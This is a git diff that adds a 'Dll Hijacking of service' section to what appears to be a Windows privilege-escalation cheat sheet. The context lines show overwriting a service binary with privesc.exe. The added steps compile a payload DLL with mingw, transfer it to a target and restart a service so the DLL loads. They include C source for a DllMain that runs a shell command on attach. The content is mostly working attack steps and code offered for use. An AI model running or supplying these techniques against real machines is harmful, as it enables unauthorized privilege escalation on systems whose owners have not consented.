@@ -611,3 +611,25 @@ accesschk64.exe -wvu "c:\path\of\service\directory"
 copy /y c:\path\to\privesc.exe "c:\path\of\service\directory\servicebinaryname.exe
 ```
 
+### [Dll Hijacking of service]  
+  
+1. Add your payload into your dll.c code within your system() function (see below code or you can access  
+https://github.com/sagishahar/scripts/blob/master/windows_dll.c  
+2. Compile your codeinto a dll  
+x86_64-w64-mingw32-gcc dll.c -shared -o payload.dll  
+3. Transfer to target  
+4. Stop and start service that uses your dll  
+sc stop servicename & sc start servicename  
+  
+```c
+#include <windows.h>
+
+BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
+    if (dwReason == DLL_PROCESS_ATTACH) {
+        system("cmd.exe /k whoami > C:\\Temp\\poop.txt");
+        ExitProcess(0);
+    }
+    return TRUE;
+}
+
+```
